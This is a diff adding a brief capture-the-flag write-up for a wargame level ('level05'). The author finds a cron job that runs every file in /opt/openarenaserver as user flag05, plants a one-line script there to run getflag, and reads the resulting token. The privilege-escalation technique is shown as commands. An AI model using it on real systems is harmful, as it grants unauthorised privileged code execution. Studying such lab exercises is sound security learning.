@@ -1,0 +1,23 @@
+1. like level00 we do find / -name level05 2>/dev/null 
+	we get result /var/mail/level05
+				/rofs/var/mail/level05
+2. we cat either of the file , we get content:
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+	accorfing to https://crontab.guru/#*/2_*_*_*_*
+	this crontab means every 2 mins we are the shell script as user flag05's right
+3, we cat the shell script
+	cat /usr/sbin/openarenaserver
+	for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+	done
+	above scripting means:
+	Gets all file of the directory /opt/openarenaserver/
+	Set the CPU time limit to 5 Seconds
+	Execute the file that is being processed
+	Delete the file / bash -x means before run command will print the command, so we know which command we are running
+4. so we can run a script in the folder which runs getflag and save the result somewhere in a file.
+	echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
+5, wait ard 2 min, we cat /tmp/flag05
+	we get the token viuaaale9huek52boumoomioc
+	bingo!
